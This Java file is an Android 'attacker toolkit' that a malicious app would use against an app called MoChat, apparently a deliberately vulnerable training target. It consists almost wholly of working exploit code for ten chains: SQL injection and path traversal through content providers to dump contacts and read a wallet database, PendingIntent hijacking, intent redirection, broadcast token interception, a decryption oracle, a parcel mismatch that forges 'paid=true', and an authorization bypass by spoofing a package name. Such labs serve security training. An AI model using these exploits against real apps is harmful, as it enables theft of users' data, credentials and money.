package com.mochat.attacker;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;

/**
 * MoChat attacker toolkit — triggers all 10 chains via a malicious third-party app.
 *
 * <p>No adb required. Each method uses Intent / deeplink / bindService /
 * ContentResolver to exploit MoChat's exported surface from another app's context.</p>
 */
public final class MoChatAttacker {

    private static final String TAG = "Attacker";
    private static final String PKG = "com.mochat.app";

    private final Context ctx;
    private Messenger walletSvc, orderSvc, pushSvc;
    private final Messenger replyMsn = new Messenger(new ReplyHandler());
    private volatile String lastReply;

    public MoChatAttacker(Context ctx) { this.ctx = ctx; }

    // ================================================================
    // Chain #1 (EASY): Exported Balance Leak — launch exported Activity
    // ================================================================
    public void chain1_exportedBalance() {
        Intent i = new Intent();
        i.setComponent(new ComponentName(PKG, PKG + ".wallet.AccountActivity"));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        Log.i(TAG, "chain1: launched AccountActivity — balance visible on screen");
    }

    // ================================================================
    // Chain #2 (EASY): SQLi Contact Dump — ContentResolver query
    // ================================================================
    public void chain2_sqliContactDump() {
        Uri uri = Uri.parse("content://" + PKG + ".contacts/contacts");
        Cursor c = ctx.getContentResolver().query(uri, null,
                "' OR '1'='1", null, null);
        if (c != null) {
            while (c.moveToNext()) {
                String row = "";
                for (int i = 0; i < c.getColumnCount(); i++)
                    row += c.getString(i) + " | ";
                Log.i(TAG, "chain2: " + row);
            }
            c.close();
        }
    }

    // ================================================================
    // Chain #3 (EASY): Path Traversal — read wallet.db via backup provider
    // ================================================================
    public void chain3_pathTraversalWallet() {
        Uri uri = Uri.parse("content://" + PKG + ".backup/..%2Fdatabases%2Fwallet.db");
        try {
            Cursor c = ctx.getContentResolver().query(uri, null, null, null, null);
            Log.i(TAG, "chain3: wallet.db queried, rows=" + (c != null ? c.getCount() : -1));
            if (c != null) c.close();
        } catch (Throwable t) {
            Log.e(TAG, "chain3: " + t.getMessage());
        }
    }

    // ================================================================
    // Chain #4 (MEDIUM): PendingIntent Hijack — bind PushService
    // ================================================================
    public void chain4_pendingIntentHijack() {
        bindService(PKG + ".settings.PushService", con -> pushSvc = con);
        delay(1000);
        if (pushSvc != null) {
            Message msg = Message.obtain(null, 0x401); // MSG_GET_PENDING
            msg.replyTo = replyMsn;
            try { pushSvc.send(msg); } catch (RemoteException e) { }
            Log.i(TAG, "chain4: sent MSG_GET_PENDING, waiting for mutable PI...");
        }
    }

    // ================================================================
    // Chain #5 (MEDIUM): WebView JS-Bridge — trigger via deeplink
    // ================================================================
    public void chain5_webviewJsBridge() {
        Intent i = new Intent(Intent.ACTION_VIEW,
                Uri.parse("mochat://mall/open?page=mall"));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
        Log.i(TAG, "chain5: triggered mall deeplink — JS bridge now accessible");
    }

    // ================================================================
    // Chain #6 (MEDIUM): Intent Redirection — broadcast to ShareReceiver
    // ================================================================
    public void chain6_intentRedirection() {
        Intent inner = new Intent();
        inner.setComponent(new ComponentName(PKG, PKG + ".wallet.AccountActivity"));
        Intent broadcast = new Intent(PKG + ".action.SHARE");
        broadcast.putExtra("nextIntentURI",
                "intent:#Intent;component=" + PKG + "/.wallet.AccountActivity;end");
        ctx.sendBroadcast(broadcast);
        Log.i(TAG, "chain6: sent SHARE broadcast with nested intent");
    }

    // ================================================================
    // Chain #7 (MEDIUM): Broadcast Token Intercept — register receiver
    // (In a real attack the malicious app declares a receiver in its manifest)
    // ================================================================
    public void chain7_broadcastTokenIntercept() {
        // The malicious app would register for com.mochat.app.action.TOKEN_BROADCAST
        // in its AndroidManifest.xml. Here we just trigger it for demonstration.
        Log.i(TAG, "chain7: register <receiver> for TOKEN_BROADCAST in manifest to intercept JWT");
    }

    // ================================================================
    // Chain #8 (HARD): Messenger Crypto Oracle — bind WalletService
    // ================================================================
    public void chain8_messengerOracle() {
        bindService(PKG + ".wallet.WalletService", con -> walletSvc = con);
        delay(1000);
        if (walletSvc != null) {
            // MSG_DECRYPT (0xD01): send an encrypted BLOB, get plaintext back
            Message msg = Message.obtain(null, 0xD01);
            Bundle data = new Bundle();
            // The balance_enc BLOB from the accounts table — in practice, read it
            // via chain #3 (path traversal) first, then send here to decrypt.
            data.putString("b64", "PLACEHOLDER_BASE64_BLOB");
            msg.setData(data);
            msg.replyTo = replyMsn;
            try { walletSvc.send(msg); } catch (RemoteException e) { }
            Log.i(TAG, "chain8: sent MSG_DECRYPT to oracle");
        }
    }

    // ================================================================
    // Chain #9 (HARD): Parcel Mismatch — bind OrderService
    // ================================================================
    public void chain9_parcelMismatch() {
        bindService(PKG + ".mall.OrderService", con -> orderSvc = con);
        delay(1000);
        if (orderSvc != null) {
            Message msg = Message.obtain(null, 0x901); // MSG_CHECKOUT
            msg.replyTo = replyMsn;
            try { orderSvc.send(msg); } catch (RemoteException e) { }
            Log.i(TAG, "chain9: sent MSG_CHECKOUT — parcel mismatch should forge paid=true");
        }
    }

    // ================================================================
    // Chain #10 (INSANE): AIDL Auth Bypass — bind WalletService, spoof pkg
    // ================================================================
    public void chain10_aidlBypass() {
        bindService(PKG + ".wallet.WalletService", con -> walletSvc = con);
        delay(1000);
        if (walletSvc != null) {
            Message msg = Message.obtain(null, 0xD04); // MSG_ADMIN_QUERY
            Bundle data = new Bundle();
            // Spoof the trusted package name — the guard trusts this field
            // instead of Binder.getCallingUid().
            data.putString("packageName", "com.mochat.app.trusted");
            msg.setData(data);
            msg.replyTo = replyMsn;
            try { walletSvc.send(msg); } catch (RemoteException e) { }
            Log.i(TAG, "chain10: sent MSG_ADMIN_QUERY with spoofed packageName");
        }
    }

    // ================================================================
    // Helpers
    // ================================================================

    private void bindService(String className, java.util.function.Consumer<Messenger> onBind) {
        Intent i = new Intent();
        i.setComponent(new ComponentName(PKG, className));
        ctx.bindService(i, new ServiceConnection() {
            public void onServiceConnected(ComponentName name, IBinder service) {
                onBind.accept(new Messenger(service));
            }
            public void onServiceDisconnected(ComponentName name) { }
        }, Context.BIND_AUTO_CREATE);
    }

    private void delay(int ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { }
    }

    private class ReplyHandler extends Handler {
        @Override public void handleMessage(Message msg) {
            Bundle data = msg.getData();
            lastReply = data != null ? data.toString() : "(empty)";
            Log.i(TAG, "reply: " + lastReply);
        }
    }
}
